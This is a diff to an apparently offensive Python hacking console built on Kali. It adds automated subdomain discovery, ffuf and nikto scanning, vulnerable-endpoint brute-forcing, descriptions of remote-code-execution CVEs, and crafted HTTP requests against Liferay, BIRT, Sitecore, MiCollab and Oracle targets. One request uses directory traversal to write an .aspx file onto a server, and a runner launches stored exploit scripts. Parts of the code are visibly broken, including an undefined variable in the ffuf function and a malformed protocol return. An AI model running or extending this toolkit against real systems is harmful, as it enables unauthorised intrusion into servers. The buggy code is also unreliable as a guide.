@@ -33,12 +33,29 @@ import phonenumbers
 from phonenumbers import geocoder, timezone, carrier
 #from opencage.geocoder import OpenCageGeocode
 #import folium
+import termios
+import tty
 import pty
 import signal
 import textwrap
 import shutil
 import pexpect
 import configparser
+from urllib3.exceptions import InsecureRequestWarning
+import urllib.parse
+from requests.exceptions import Timeout, RequestException
+import sys
+from collections import defaultdict
+from nltk.tokenize import word_tokenize
+from nltk.corpus import stopwords
+from nltk.stem import PorterStemmer
+import nltk
+from nltk.data import find
+from concurrent.futures import ThreadPoolExecutor
+import concurrent.futures
+from datetime import datetime, timedelta
+import openai
+import qrcode
 
 try:
     import requests.packages.urllib3
@@ -51,7 +68,7 @@ def banner():
     Prints one of five ASCII art banners based on a randomly generated number.
     """
     # Generate a random integer between 1 and 4
-    random_num = random.randint(1, 4)
+    random_num = random.randint(1, 3)
 
     # Print one of the five outputs based on the random number generated
     if random_num == 1:
@@ -94,6 +111,7 @@ sessions = {}
 session_counter = 1
 terminal_size = shutil.get_terminal_size((80, 20))  # Default to 80x20 if unable to determine
 terminal_width = terminal_size.columns
+current_index = -1
 
 # Initialize a ConfigParser object
 config = configparser.ConfigParser()
@@ -107,56 +125,1352 @@ default_rhosts = ""
 default_password_wordlist = ""
 default_user_wordlist = ""
 default_exploit_target = ""
-default_encoder = ""
 default_exit_on_session = ""
 default_verbose = ""
 default_rport = ""
 default_evasion = ""
 default_nop = ""
 default_badchars = ""
-default_iterations = ""
 default_timeout = ""
 default_http_user_agent = ""
 default_ssl = ""
+default_encoder = ""
+default_iterations = ""
+
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+# Input static or default wordlist values
+sql_endpoints_file = "/home/kali/VforMSF/wordlists/SQLEndpoints.txt"
+lfi_endpoints_file = "/home/kali/VforMSF/wordlists/LFIEndpoints.txt"
+deserialization_endpoints_file = "/home/kali/VforMSF/wordlists/DeserializationEndpoints.txt"
+upload_endpoints_file = "/home/kali/VforMSF/wordlists/UploadEndpoints.txt"
+exploits_directory = "/home/kali/VforMSF/exploits/"
+dirb_default_wordlist = "/usr/share/dirb/wordlists/big.txt"
+#ffuf_default_wordlist = "/usr/share/dirb/wordlists/big.txt"
+ffuf_default_wordlist = "/home/kali/VforMSF/wordlists/medium-directory-list-lowercase-2.3-medium.txt"
+misc_vuln_endpoints = "/home/kali/VforMSF/wordlists/MiscVulnerableEndpoints.txt"
+misc_vuln_endpoints_2 = "/home/kali/VforMSF/wordlists/MiscVulnerableEndpoints_2.txt"
+endpoints_with_paths = "/home/kali/VforMSF/wordlists/AllFilesWithPath.txt"
+sublist3r_output_file = "/home/kali/VforMSF/temp/subdomains.txt"
+payloads_directory = "/home/kali/VforMSF/payloads/"
+
+# Set global variables
+globaltarget = None
+globaltargetenabled = False
+limitloop = False
+target_is_ip = False
+target_is_url = False
+
+scheduled_commands = []
 
 banner()
 
-# Mapping of payloads to their default file extensions
-payload_extensions = {
-    'windows/x64/meterpreter/reverse_tcp': 'exe',
-    'windows/x64/meterpreter_reverse_tcp': 'exe',
-    'windows/x64/shell/reverse_tcp': 'exe',
-    'windows/x64/shell_reverse_tcp': 'exe',
-    'linux/x64/meterpreter/reverse_tcp': 'elf',
-    'linux/x64/shell_reverse_tcp': 'elf',
-    'osx/x64/meterpreter/reverse_tcp': 'macho',
-    'osx/x64/meterpreter_reverse_tcp': 'macho',
-    'osx/x64/shell_reverse_tcp': 'macho',
-    'php/meterpreter_reverse_tcp': 'php',
-    'php/reverse_php': 'php',
-    'java/jsp_shell_reverse_tcp': 'jsp',
-    'java/shell_reverse_tcp': 'war',
-    'android/meterpreter/reverse_tcp': 'apk',
-    'cmd/unix/reverse_python': 'py',
-    'cmd/unix/reverse_bash': 'sh',
-}
+def generate_qr_code(url_input):
+    print("QR Code Generator")
+    print("")
+    
+    if not url_input:
+        url_input = input("Enter the URL/destination (press enter to exit)> ").strip()
+        if not url_input:
+            color = "\033[93m"
+            reset_color = "\033[0m"
+            print(f"{color}[-] exiting...{reset_color}")
+            return
+
+    file_name = input("Enter the file name (press enter to exit)> ").strip()
+    if not file_name:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] exiting...{reset_color}")
+        return
+    
+    if not file_name.endswith(".png"):
+        file_name += ".png"
+
+    full_path = os.path.join(payloads_directory, file_name)
+    
+    qr = qrcode.QRCode(
+        version=1,  
+        error_correction=qrcode.constants.ERROR_CORRECT_L,
+        box_size=10,
+        border=4,
+    )
+    qr.add_data(url_input)
+    qr.make(fit=True)
+    
+    qr_image = qr.make_image(fill_color="black", back_color="white")
+    
+    qr_image.save(full_path)
+    
+    color = "\033[92m"
+    reset_color = "\033[0m"
+    print(f"{color}[+] QR code saved as {file_name}{reset_color}")
+
+def cancel_scheduled_command(command):
+    for entry in scheduled_commands:
+        if entry["command"] == command and entry["timer"].is_alive():
+            entry["timer"].cancel()
+            scheduled_commands.remove(entry)
+            color = "\033[92m"
+            reset_color = "\033[0m"
+            print(f"{color}[+] Scheduled command '{command}' has been canceled.{reset_color}")
+            return
+    color = "\033[93m"
+    reset_color = "\033[0m"
+    print(f"{color}[-] No scheduled command found.{reset_color}")
+
+def cancel_all_scheduled_commands():
+    for entry in scheduled_commands[:]:  # Use a copy to avoid modification issues
+        if entry["timer"].is_alive():
+            entry["timer"].cancel()
+            print(f"[+] Scheduled command '{entry['command']}' has been canceled.")
+        # Remove the entry whether the timer was active or not
+        scheduled_commands.remove(entry)
+
+    if not scheduled_commands:
+        color = "\033[92m"  # Green color
+        reset_color = "\033[0m"
+        print(f"{color}[+] All scheduled commands have been canceled.{reset_color}")
+    else:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] Some scheduled commands could not be cleared.{reset_color}")
+
+def write_to_terminal(command, master):
+    if master is None or not isinstance(master, int):
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] Master file descriptor is not initialized or invalid.{reset_color}")
+        return
+
+    try:
+        os.write(master, f"{command}\n".encode())
+    except OSError as os_error:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] OS error while writing to terminal: {os_error}{reset_color}")
+    except Exception as e:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] Failed to write command to terminal: {e}{reset_color}")
+
+def run_command(command, master):
+    try:
+        color = "\033[92m"
+        reset_color = "\033[0m"
+        print(f"{color}[+] Sending command to terminal: {command}{reset_color}")
+        write_to_terminal(command, master)
+    except Exception as e:
+        color = "\033[93m"  # Yellow for warnings/errors
+        reset_color = "\033[0m"
+        print(f"{color}[-] An error occurred while sending the command: {e}{reset_color}")
+
+def schedule_command_with_delay(command, delay_in_seconds, master):
+    run_at = datetime.now() + timedelta(seconds=delay_in_seconds)
+    print(f"[+] {command} will run in {delay_in_seconds} seconds (at {run_at.strftime('%Y-%m-%d %H:%M:%S')}).")
+
+    # Create the timer and store it in the list
+    timer = threading.Timer(delay_in_seconds, run_command, [command, master])
+    scheduled_commands.append({
+        "command": command,
+        "timer": timer,
+        "type": "delay-based",
+        "time": run_at.strftime('%Y-%m-%d %H:%M:%S'),
+    })
+
+    # Start the timer
+    timer.start()
+
+def print_scheduled_commands():
+    if not scheduled_commands:
+        print("[-] No commands are currently scheduled.")
+        return
+
+    print(f"[+] Scheduled Commands:")
+    print("=======================")
+
+    now = datetime.now()
+    past_commands = []
+    upcoming_commands = []
+
+    for entry in scheduled_commands:
+        scheduled_time = datetime.strptime(entry['time'], '%Y-%m-%d %H:%M:%S')
+        if scheduled_time < now:
+            past_commands.append(entry)
+        else:
+            upcoming_commands.append(entry)
+
+    if past_commands:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] Past Commands:{reset_color}")
+        for idx, entry in enumerate(past_commands, 1):
+            print(f"{idx}. Command: {entry['command']}")
+            print(f"   Scheduled Time: {entry['time']}")
+        print()
+
+    if upcoming_commands:
+        color = "\033[92m"
+        reset_color = "\033[0m"
+        print(f"{color}[+] Upcoming Commands:{reset_color}")
+        for idx, entry in enumerate(upcoming_commands, 1):
+            print(f"{idx}. Command: {entry['command']}")
+            print(f"   Scheduled Time: {entry['time']}")
+        print()
+
+def process_wordlist_ffuf(sublist3r_output_file):
+    try:
+        with open(sublist3r_output_file, "r") as file:
+            for line in file:
+                domain = line.strip()
+                if domain:
+                    protocol = check_protocol(domain)
+                    if protocol:
+                        full_url = f"{protocol}{domain}"
+                        run_ffuf_scan(full_url)
+                else:
+                    print(f"[-] Error initiating scan")
+    except Exception as e:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] An error occurred: {e}{reset_color}")
+
+def run_ffuf_scan(full_url):
+    try:
+        print(" ")
+        print("[+] Fuzzing for Directories...")
+        print(" ")
+        command = f"ffuf -u {domain}/FUZZ -w {ffuf_default_wordlist} -c -mc all -fc 404,400  -D -e zip,aspx,vbhtml -recursion -t 50 -sf -ac"
+        subprocess.call(command, shell=True)
+    except KeyboardInterrupt:
+        print("[-] KeyboardInterrupt detected. Moving on...")
+        print(" ")
+    except Exception as e:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] An error occurred: {e}{reset_color}")
+
+def process_wordlist_nikto(sublist3r_output_file):
+    try:
+        with open(sublist3r_output_file, "r") as file:
+            for line in file:
+                domain = line.strip()
+                if domain:
+                    run_nikto_scan(domain)
+                else:
+                    print(f"[-] Error initiating scan")
+    except Exception as e:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] An error occurred: {e}{reset_color}")
+
+def run_nikto_scan(domain):
+    try:
+        print(" ")
+        print("[+] Running Nikto Vulnerability Scan...")
+        print(" ")
+        command = f"nikto -h {domain} -Display 4P -C all"
+        subprocess.call(command, shell=True)
+    except KeyboardInterrupt:
+        print("[-] KeyboardInterrupt detected. Moving on...")
+        print(" ")
+    except Exception as e:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] An error occurred: {e}{reset_color}")
+
+def process_wordlist_check_endpoints(sublist3r_output_file, domain, filename):
+    try:
+        with open(sublist3r_output_file, "r") as file:
+            for line in file:
+                hostname = line.strip()  # Remove any leading/trailing whitespace
+                protocol = check_protocol(hostname)
+                domain = f"{protocol}{hostname}"
+                print("")
+                if domain:  # Ensure the line is not empty
+                    check_endpoints(domain, filename)
+    except Exception as e:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}An error occurred while processing the wordlist: {e}{reset_color}")
+
+def check_protocol(hostname):
+    https_url = f"https://{hostname}"
+    http_url = f"http://{hostname}"
+    
+    try:
+        # Try HTTPS first
+        response = requests.get(https_url, timeout=5)
+        if response.status_code in [200, 300, 301, 302, 303, 304]:
+            return "https://"
+    except requests.RequestException:
+        pass
+    
+    try:
+        # Fallback to HTTP if HTTPS fails
+        response = requests.get(http_url, timeout=5)
+        if response.status_code in [200, 300, 301, 302, 303, 304]:
+            return "http://"
+    except requests.RequestException:
+        pass
+    
+    return "http"
+
+def process_wordlist_check_cve(sublist3r_output_file, domain):
+    try:
+        with open(sublist3r_output_file, "r") as file:
+            for line in file:
+                hostname = line.strip()  # Remove any leading/trailing whitespace
+                protocol = check_protocol(hostname)
+                domain = f"{protocol}{hostname}"
+                print("")
+                print(f"Checking {domain} Against our Exploit Scripts...")
+                print("")
+                if domain:  # Ensure the line is not empty
+                    check_cve(domain)
+    except Exception as e:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}An error occurred while processing the wordlist: {e}{reset_color}")
+
+def is_valid_subdomain(subdomain):
+    url = f"https://{subdomain}"
+    try:
+        response = requests.get(url, timeout=5)
+        if response.status_code in [200, 301, 302]:
+            return True
+    except requests.RequestException:
+        pass
+    return False
+
+def capture_subdomains(domain, sublist3r_output_file):
+    hostname = urllib.parse.urlsplit(domain).hostname
+    if not hostname:
+        print(f"[-] Invalid domain: {domain}")
+        return
+
+    try:
+        command = f"subfinder -t 32 -d {hostname}"
+        result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
+        with open(sublist3r_output_file, "w") as file:
+            file.write(f"{hostname}\n")
+            color = "\033[92m"
+            reset_color = "\033[0m"
+            print(f"{color}[+] {hostname} has been added to subdomains.txt{reset_color}")
+            line_count = 0
+            subdomains = []
+
+            for line in result.stdout:
+                line_count += 1
+                # Display the first 24 lines (banner)
+                if line_count <= 24:
+                    print(line.strip())
+                    continue
+
+                # Regular expression to match ANSI escape sequences
+                ansi_escape = re.compile(r'\x1B\[\d+m')
+                # Remove ANSI escape codes and unwanted sequences
+                clean_line = ansi_escape.sub('', line).strip()
+                clean_line = re.sub(r'^\d+m|\d+m$', '', clean_line)
+
+                if clean_line:
+                    subdomains.append(clean_line)
+
+            # Validate subdomains concurrently
+            with concurrent.futures.ThreadPoolExecutor() as executor:
+                future_to_subdomain = {executor.submit(is_valid_subdomain, sd): sd for sd in subdomains}
+                for future in concurrent.futures.as_completed(future_to_subdomain):
+                    subdomain = future_to_subdomain[future]
+                    try:
+                        if future.result():
+                            file.write(f"{subdomain}\n")
+                            color = "\033[92m"
+                            reset_color = "\033[0m"
+                            print(f"{color}[+] {subdomain} has been validated and added to subdomains.txt{reset_color}")
+                    except Exception as exc:
+                        # Optionally log exceptions or handle specific cases
+                        pass
+
+        result.wait()
+        if result.returncode != 0:
+            stderr_output = result.stderr.read()
+            print(f"[-] Command failed with exit code {result.returncode}: {stderr_output}")
+    except Exception as e:
+        pass
+
+def vsearch(search_input):
+    directory = exploits_directory
+    if not os.path.isdir(directory):
+        print("[-] Invalid directory")
+    else:
+        file_keywords = index_files(directory)
+
+    search_terms = search_input.split()  # Split search input by spaces
+    results = search_files(file_keywords, search_terms)
+            
+    if results:
+        print("[+] Search results:")
+        for idx, (file, score) in enumerate(results, start=1):
+            print(f"{idx}. {file}:")
+                
+        # Prompt user to select a file
+        while True:
+            selection = input_with_backspace(f"\nInteract with 'info [number]' or 'use [number]' (Press enter to exit)> ").strip()
+            if not selection:
+                return
+            parts = selection.split(" ", 1)
+            if len(parts) != 2:
+                print("[-] Invalid selection. Available commands are 'info' or 'use' [number]")
+                continue
+            interaction = parts[0].strip()
+            selected = parts[1].strip()
+            if selected.isdigit() and 1 <= int(selected) <= len(results):
+                selected_file = results[int(selected) - 1][0]
+                if interaction in ["use", "info"]:
+                    if interaction == "info":
+                        function_name = f"info_on_{os.path.splitext(os.path.basename(selected_file))[0]}"
+                        function = globals().get(function_name)
+                        if function:
+                            function()
+                        else:
+                            print(f"[-] No info function found for {selected_file}")
+
+                    if interaction == "use":
+                        print(f"[+] Executing: {selected_file}")
+                        print("")
+                        try:
+                            full_path = os.path.join(directory, selected_file)
+                            subprocess.run(["python3", full_path], check=True) #only python scripts in the exploit directory
+                        except subprocess.CalledProcessError as e:
+                            print(f"[-] Error executing {selected_file}: {e}")
+                        print("")
+                        color = "\033[92m"
+                        reset_color = "\033[0m"
+                        print(f"{color}[+] completed{reset_color}")
+                        print("")
+                        print("[+] Search results:")
+                        for idx, (file, score) in enumerate(results, start=1):
+                            print(f"{idx}. {file}:")
+                else:
+                    print("[-] Invalid selection. Available commands are 'info' or 'use' [number]")
+            else:
+                print("[-] Invalid selection. Please enter a valid number.")
+    else:
+        print("[-] No results from search.")
+
+def info_on_CVE_2015_4670():
+    print("""
+    CVE-2015-4670:
+    --------------------
+    **Description**:
+    - Directory traversal vulnerability in the AjaxFileUpload control in DevExpress AJAX Control Toolkit (aka AjaxControlToolkit) before 15.1.
+    - Allows remote attackers to write to arbitrary files via a .. (dot dot) in the fileId parameter to AjaxFileUploadHandler.axd.
+    - This can be exploited to upload a shell leading to remote code execution.
+    """)
+
+def info_on_CVE_2020_7961():
+    print("""
+    CVE-2020-7961:
+    --------------------
+    **Description**:
+    - A remote code execution (RCE) vulnerability in Liferay Portal through 7.2.0 and Liferay DXP through 7.2.
+    - The JSON web services in Liferay Portal and Liferay DXP allow remote attackers to execute arbitrary code via a crafted JSON web service request.
+    **Affected Versions**:
+    """)
+
+def info_on_CVE_2021_34427():
+    print("""
+    CVE-2021-34427:
+    --------------------
+    **Description**:
+    - In Eclipse BIRT versions 4.8.0 and earlier, an attacker can use query parameters to create a JSP file which is accessible from remote (current BIRT viewer dir) to inject JSP code into the running instance.
+    - A successful exploit could allow remote code execution
+    **Affected Versions**:
+    - Eclipse BIRT versions 4.8.0 and earlier.
+    """)
+
+def info_on_CVE_2022_21445():
+    print("""
+    CVE-2022-21445:
+    --------------------
+    **Description**:
+    - Vulnerability in the Oracle E-Business Suite (component: Oracle Marketing).
+    - Supported versions that are affected are 12.2.9-12.2.10.
+    - Easily exploitable vulnerability allows with network access to compromise Oracle Marketing via HTTP.
+    - A successful exploit could allow remote code execution
+    **Affected Versions**:
+    - Oracle ADF 12.2.9-12.2.10
+    """)
+
+def info_on_CVE_2022_41326():
+    print("""
+    CVE-2022-41326:
+    --------------------
+    **Description**:
+    - The web conferencing component of Mitel MiCollab through 9.6.0.13 could allow an unauthenticated attacker to upload arbitrary scripts due to improper authorization controls.
+    - A successful exploit could allow remote code execution within the context of the application.
+    **Affected Versions**:
+    - Mitel MiCollab through 9.6.0.13.
+    """)
+
+def info_on_CVE_2023_0100():
+    print("""
+    CVE-2023-0100:
+    --------------------
+    **Description**:
+    - In Eclipse BIRT, starting from version 2.6.2, the default configuration allowes you to retrieve a report from the same host using an absolute HTTP path for the report parameter (e.g., __report=http://<domain>/report.rptdesign).
+    - The Host header can be tampered with on some configurations where no virtual hosts are put in place or when the default host points to the BIRT server.
+    **Affected Versions**:
+    - Eclipse BIRT starting from version 2.6.2 up to 4.12.
+    **Patch**:
+    - This vulnerability was patched on Eclipse BIRT 4.13.
+    """)
+
+def info_on_CVE_2023_35813():
+    print("""
+    CVE-2023-35813:
+    --------------------
+    **Description**:
+    - Multiple Sitecore products are vulnerable to remote code execution.
+    - This affects Experience Manager, Experience Platform, and Experience Commerce through 10.3.
+    """)
+
+def info_on_CVE_2024_32651():
+    print("""
+    CVE-2024-32651:
+    --------------------
+    **Description**:
+    - Changedetection.io is an open-source web page change detection, website watcher, restock monitor, and notification service.
+    - There is a Server Side Template Injection (SSTI) in Jinja2 that allows Remote Command Execution on the server host.
+    - The impact is critical as the attacker can completely take over the server machine.
+    - This can be reduced if changedetection is behind a login page, but this isn't required by the application (not by default).
+    """)
+
+def info_on_DecisionsFileWrite():
+    print("""
+    Decisions /xml/WriteFile:
+    -------------------------
+    **Description**:
+    - Many decisions software versions contain endpoints allowing arbitrary file upload.
+    - This specific /xml/WriteFile endpoint allows you to specify a path for the file.
+    - Specifying the root web directory enables you to write a malicious file that can be navigated to and subsequentially executed.
+    - By default this endpoint was unauthenticated with a few other vulnerable endpoints but was silently patched out of Decisions.
+    - Since it does not have a CVE assigned to it, many applications utilizing decisions may be unaware.
+    """)
+
+def info_on_LogiSecureKey():
+    print("""
+    Logi /rdGetSecureKey.aspx:
+    -------------------------
+    **Description**:
+    - An issue was discovered in Logi SecureKey Authenticaton.
+    - The SecureKey used within the application can be found at a specific endpoint by providing an arbitrary username.
+    - This key gives access to the logi functonality which can be utilized in a subsequent request to execute shell commands on the system via HTTP.
+    """)
+
+def is_nltk_data_downloaded(package):
+    try:
+        find(f'tokenizers/{package}')
+        return
+    except LookupError:
+        download_nltk_data()
+
+def download_nltk_data():
+    original_stdout = sys.stdout  # Save a reference to the original standard output
+    original_stderr = sys.stderr  # Save a reference to the original standard error
+    sys.stdout = open(os.devnull, 'w')  # Redirect standard output to null
+    sys.stderr = open(os.devnull, 'w')  # Redirect standard error to null
+    try:
+        if not is_nltk_data_downloaded('punkt'):
+            nltk.download('punkt')
+        if not is_nltk_data_downloaded('stopwords'):
+            nltk.download('stopwords')
+    finally:
+        sys.stdout.close()  # Close the redirected standard output
+        sys.stderr.close()  # Close the redirected standard error
+        sys.stdout = original_stdout  # Reset standard output to original
+        sys.stderr = original_stderr  # Reset standard error to original
+
+def index_files(directory):
+    file_keywords = defaultdict(list)
+    stop_words = set(stopwords.words('english'))
+    ps = PorterStemmer()
+
+    for root, _, files in os.walk(directory):
+        for file in files:
+            file_path = os.path.join(root, file)
+            try:
+                with open(file_path, 'r', encoding='utf-8') as f:
+                    content = f.read()
+                    # Tokenize content using NLTK
+                    words = word_tokenize(content)
+                    # Remove stop words and stem the remaining words
+                    keywords = [ps.stem(word) for word in words if word.isalnum() and word.lower() not in stop_words]
+                    file_keywords[file].extend(keywords)
+            except Exception as e:
+                color = "\033[93m"
+                reset_color = "\033[0m"
+                print(f"{color}Failed to read {file_path}: {e}{reset_color}")
+
+    return file_keywords
+
+def search_files(file_keywords, search_terms):
+    ps = PorterStemmer()
+    processed_terms = [ps.stem(term) for term in search_terms]
+
+    results = []
+
+    for file, keywords in file_keywords.items():
+        score = sum(keywords.count(term) for term in processed_terms)  # Calculate score based on keyword occurrences
+        if score > 0:
+            results.append((file, score))
+
+    # Sort results by score in descending order
+    results.sort(key=lambda x: x[1], reverse=True)
+
+    return results
+
+def list_all_files(directory):
+    files = []
+    for root, _, filenames in os.walk(directory):
+        for file in filenames:
+            files.append(file)
+    return files
+
+def enable_global_target(url_input):
+    global globaltarget, globaltargetenabled, target_is_ip, target_is_url
+    
+    while True:
+        if url_input:
+            target = url_input
+        else:
+            target = input_with_backspace("\nGlobal Target IP or URL (Press enter to exit)> ")
+            if not target:
+                return  # Exit the function if the user presses Enter without inputting anything
+        
+        if validators.url(target):
+            globaltarget = target
+            globaltargetenabled = True
+            target_is_ip = False
+            target_is_url = True
+            print("")
+            color = "\033[92m"
+            reset_color = "\033[0m"
+            print(f"{color}[+] Global target set to URL: {globaltarget}{reset_color}")
+            break
+        elif validate_ip_address(target):
+            globaltarget = target
+            globaltargetenabled = True
+            target_is_ip = True
+            target_is_url = False
+            print("")
+            print(f"{color}[+] Global target set to IP: {globaltarget}{reset_color}")
+            break
+        else:
+            print("[-] Invalid input. Please enter a valid IP address or URL.")
+
+def disable_global_target():
+    global globaltarget, globaltargetenabled, target_is_ip, target_is_url, limitloop
+    
+    globaltarget = None
+    globaltargetenabled = False
+    target_is_ip = False
+    target_is_url = False
+    limitloop = False
+    print("")
+    print("[-] Global target disabled.")
+
+def read_endpoints_from_file(file_path):
+    try:
+        with open(file_path, 'r') as file:
+            endpoints = file.read().splitlines()
+        return endpoints
+    except Exception as e:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] An error occurred while reading the file: {e}{reset_color}")
+        return []
+
+def send_get_request(domain, endpoint):
+    url = f"{domain}{endpoint}"
+    headers = {
+        "Host": domain.split("//")[-1],
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Connection": "close"
+    }
+    response = requests.get(url, headers=headers, verify=False, allow_redirects=False)
+    return response
+
+def check_endpoints(domain, endpoints_file):
+    endpoints = read_endpoints_from_file(endpoints_file)
+    
+    if not endpoints:
+        print(f"[-] No endpoints found in {endpoints_file} to check.")
+        return
+    
+    error_count = 0  
+    error_limit = 20  # Limit for the number of consecutive errors
+    error_count_403 = 0  
+    error_limit_403 = 20  # Limit for the number of consecutive errors
+
+    for endpoint in endpoints:
+        response = send_get_request(domain, endpoint)
+        status_code = response.status_code
+
+        if status_code in [200, 403, 500]:
+            color = "\033[92m" if status_code == 200 else "\033[93m" if status_code == 500 else "\033[91m"
+            print(f"{color}{endpoint} - Response Code: {status_code}\033[0m")
+
+            if status_code == 403:
+                error_count_403 += 1
+                if error_count_403 > error_limit_403:
+                    print(f"[-] 403 limit reached, we may be blocked, moving on...")
+                    break  # Stop processing further endpoints
+
+            if status_code == 500:
+                error_count += 1
+                if error_count > error_limit:
+                    print(f"[-] Too many consecutive errors, moving on...")
+                    break  # Stop processing further endpoints
+
+            else:
+                error_count = 0  # Reset counter if a non-error code is found
+                error_count_403 = 0
+
+def send_initial_request_cve_2015_4670(domain):
+    url = f"{domain}/SFTWealthPortal/Login/AjaxFileUploadHandler.axd?contextKey=%7BDA8BEDC8-B952-4d5d-8CC2-59FE922E2923%7D&fileId=1&fileName=D:%5CAddVantageSites%5CSFT%5CAddVantageBrowser%5CLogin%5Ctest.aspx&firstChunk=true&chunked=false"
+    headers = {
+        "Host": domain.split("//")[-1],
+        "Content-Length": "915",
+        "Cache-Control": "max-age=0",
+        "Sec-Ch-Ua": '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Sec-Ch-Ua-Platform": "Windows",
+        "Upgrade-Insecure-Requests": "1",
+        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryc8enGTRWBQW77cvL",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-User": "?1",
+        "Sec-Fetch-Dest": "document",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Connection": "close"
+    }
+    data = '''------WebKitFormBoundaryc8enGTRWBQW77cvL
+Content-Disposition: form-data; name="test"; filename="test.txt"
+test
+
+------WebKitFormBoundaryc8enGTRWBQW77cvL--'''
+    
+    try:
+        response = requests.post(url, headers=headers, verify=False, allow_redirects=False, timeout=2)
+        return response
+    except Timeout:
+        return None
+
+def send_initial_request_cve_2021_34427(domain):
+    url = f"{domain}/birt/document?__report=test.rptdesign"
+    headers = {
+        "Host": domain.split("//")[-1],  # Extract the host part from the domain
+        "Cache-Control": "max-age=0",
+        "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126"',
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Sec-Ch-Ua-Platform": "macOS",
+        "Accept-Language": "en-US",
+        "Upgrade-Insecure-Requests": "1",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Sec-Fetch-Site": "none",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-User": "?1",
+        "Sec-Fetch-Dest": "document",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Priority": "u=0, i",
+        "Connection": "keep-alive"
+    }
+    try:
+        response = requests.get(url, headers=headers, verify=False, allow_redirects=False, timeout=2)
+        return response
+    except Timeout:
+        return None
+
+def send_initial_request_cve_2022_21445(domain):
+    # Request to GET /pipe/afr/aaa/remote/ as a check
+    url = f"{domain}/pipe/afr/aaa/remote/"
+    headers = {
+        "Host": domain.split("//")[-1],  # Extract the host part from the domain
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3",
+        "Accept-Encoding": "gzip, deflate",
+        "Dnt": "1",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "iframe",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "same-origin",
+        "Te": "trailers",
+        "Connection": "keep-alive"
+    }
+    try:
+        response = requests.get(url, headers=headers, verify=False, allow_redirects=False, timeout=2)
+        return response
+    except Timeout:
+        return None
+
+def send_initial_request_cve_2022_41326(domain):
+    url = f"{domain}/awcuser/cgi-bin/vcs?xml=withXsl"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Accept-Language": "en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7",
+        "Accept-Encoding": "gzip, deflate",
+        "Connection": "close"
+    }
+    try:
+        response = requests.get(url, headers=headers, verify=False, allow_redirects=False, timeout=2)
+        return response
+    except Timeout:
+        return None
+
+def send_initial_request_cve_2023_0100(domain):
+    try:
+        response = requests.get(f"{domain}/birt/auth?username=test&dataOwner=1", verify=False, timeout=2)
+        return response
+    except Timeout:
+        return None
+
+def send_initial_request_cve_2023_35813(domain):
+    url = f"{domain}/~/xaml/Sitecore.Xaml.Tutorials.Styles.Index"
+    headers = {
+        "Host": domain.split("//")[-1],  # Extract the host part from the domain
+        "Accept-Encoding": "gzip, deflate",
+        "Accept": "*/*",
+        "Accept-Language": "en-US;q=0.9,en;q=0.8",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36",
+        "Cache-Control": "max-age=0",
+        "Content-Type": "application/x-www-form-urlencoded",
+    }
